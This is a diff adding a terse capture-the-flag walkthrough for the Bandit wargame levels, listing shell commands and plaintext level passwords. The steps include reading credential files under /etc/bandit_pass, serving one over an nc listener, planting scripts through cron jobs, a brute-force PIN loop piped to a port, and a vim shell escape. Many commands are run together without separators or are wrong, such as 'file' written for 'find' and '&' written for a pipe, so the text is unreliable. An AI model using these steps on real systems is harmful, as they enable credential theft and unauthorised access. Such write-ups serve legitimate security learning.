@@ -1,0 +1,64 @@
+Lv1/  command: cat/readme
+PASSWORD:boJ9jbbUNNfktd78OOpsqOltutMc3MY1 On this level, just read the readme file to get password
+
+Lv2/command: cat ./-Password :CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Here, using ./- will give an access
+
+
+Lv3/command: cat "spaces" Password : UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Space is the name of the file
+
+Lv4/command: cat ./inhere/.hidden Password :pIwrPrtPN36QITSp3EQaw936yaFoFgAB The file is hidden here, so we need to show
+
+Lv5/command: file ./-file*cat ./-file07 Password:koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+Lv6/ command: file ./ -size 1033ccat ./maybehere07/.file2 Password:DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+Lv7/command:  find / -user bandit7 -group bandit6 -size 33c 2>/dev/nullcat /var/lib/dpkg/info/bandit7.password Password :HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+Lv8/command:grep 'millionth' data.txt Password :cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+Lv9/command:sort data.txt & uniq -u Password :UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+Lv10/command: strings data.txt & grep '=' Password :truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+Lv11/ base64 -d data.txt Password :IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+
+Lv12/command: cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' Password:5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+Lv13/ command:mkdir /temp/RianAinaxxd -r data.txt > /temp/RianAina/data.txtcd /temp/RianAinazcat data.txt | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcatcd -rm -r /temp/allan
+ Password :8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+Lv14/ command:ssh -i sshkey.private bandit14@localhostcat /etc/bandit_pass/bandit14
+ Password :4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+Lv15/command: telnet localhost 30000 Password:BfMYroe26WYalil77FoDi9qh59eK5xN
+
+Lv16/command:openssl s_client -connect localhost:30001 password:cluFn7wTiGryunymYOu4RcffSxQluehd
+
+Lv17/ command:nmap -p 31000-32000 -sV localhostecho cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31790 RSA PRIVATE KEY SEARCHING touch /tmp/key.keynano /tmp/key.keycd /tmpchmod 600 key.keyssh -i key.key bandit17@localhostLEVEL 17 - 18diff passwords.new passwords.old Password :kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+Lv18/ command:diff passwords.new passwords.old Password :kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+Lv19/ssh -T bandit18@localhostcat readme Password :IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+Lv20/command:./bandit20-do cat /etc/bandit_pass/bandit20 Password:GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+Lv21/tmux Ctrl+b c Shell 1: nc -l 1234 < /etc/bandit_pass/bandit20 Shell 2: ./suconnect 1234 password : gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+Lv22/comand cd /etc/cron.d cat cronjob_bandit22 cat /usr/bin/cronjob_bandit22.sh cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Password : Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+
+Lv23/command:cd /etc/cron.d cat cronjob_bandit23 cat /usr/bin/cronjob_bandit23.sh cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1) passsword : jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+Lv24/command:cd /etc/cron.d cat cronjob_bandit24 cd /var/spool/bandit24 touch t.sh nano t.sh t.sh #!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/tmp_pass cat /tmp/tmp_pass 
+password : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Lv25/command:cd /tmp touch t.sh nano t.sh ####t.sh touch pin.txt cp /dev/null pin.txt for i in {0..9}{0..9}{0..9}{0..9} do 	echo $(cat /etc/bandit_pass/bandit24) $i >> pin.txt done cat pin.txt | nc localhost 30002 > answer.txt cat answer.txt 0Password : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Lv26/command::e /etc/bandit_pass/bandit26 password : 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Lv27/command:v # open vim :set shell=/bin/bash # set shell to normal shell :shell # return to shell ./bandit27-do /etc/bandit_pass/bandit27
+ Password : 3ba3118a22e93127a4ed485be72ef5ea
+
+Lv28/command:cd /tmp/ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo cd repo cat README 
+password: 0ef186ac70e04ea33b4c1853d2526fa2
